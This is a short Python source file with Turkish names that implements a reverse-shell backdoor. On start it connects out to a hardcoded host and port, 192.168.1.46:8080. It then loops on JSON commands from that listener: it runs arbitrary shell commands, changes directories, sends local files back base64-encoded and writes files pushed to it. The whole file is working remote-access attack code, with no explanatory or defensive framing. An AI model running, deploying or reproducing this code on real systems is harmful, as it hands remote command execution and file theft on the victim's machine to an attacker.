import socket
import subprocess
import simplejson
import os
import base64

class SoketBaglantisi:
    def __init__(self, ip, port):
        self.baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.baglanti.connect((ip, port))

    def komut_calistir(self, komut):
        try:
            return subprocess.check_output(komut, shell=True, stderr=subprocess.STDOUT, encoding="cp857")
        except subprocess.CalledProcessError as e:
            return e.output

    def json_gonder(self, veri):
        json_veri = simplejson.dumps(veri)
        self.baglanti.send(json_veri.encode("utf-8"))

    def json_al(self):
        json_veri = ""
        while True:
            try:
                json_veri += self.baglanti.recv(1024).decode("utf-8")
                return simplejson.loads(json_veri)
            except ValueError:
                continue

    def dizin_degistir(self, dizin):
        os.chdir(dizin)
        return "Dizin değiştirildi: " + dizin

    def dosya_icerigi_al(self, yol):
        with open(yol, "rb") as dosya:
            return base64.b64encode(dosya.read()).decode("utf-8")

    def dosya_kaydet(self, yol, icerik):
        with open(yol, "wb") as dosya:
            dosya.write(base64.b64decode(icerik))
        return "İndirme tamamlandı"

    def soket_baslat(self):
        while True:
            komut = self.json_al()
            try:
                if komut[0] == "cikis":
                    self.baglanti.close()
                    exit()
                elif komut[0] == "cd" and len(komut) > 1:
                    komut_ciktisi = self.dizin_degistir(komut[1])
                elif komut[0] == "indir":
                    komut_ciktisi = self.dosya_icerigi_al(komut[1])
                elif komut[0] == "yukle":
                    komut_ciktisi = self.dosya_kaydet(komut[1], komut[2])
                else:
                    komut_ciktisi = self.komut_calistir(komut)
            except Exception as e:
                komut_ciktisi = f"Hata: {str(e)}"
            self.json_gonder(komut_ciktisi)
        self.baglanti.close()

soket_baglantisi = SoketBaglantisi("192.168.1.46", 8080)
soket_baglantisi.soket_baslat()
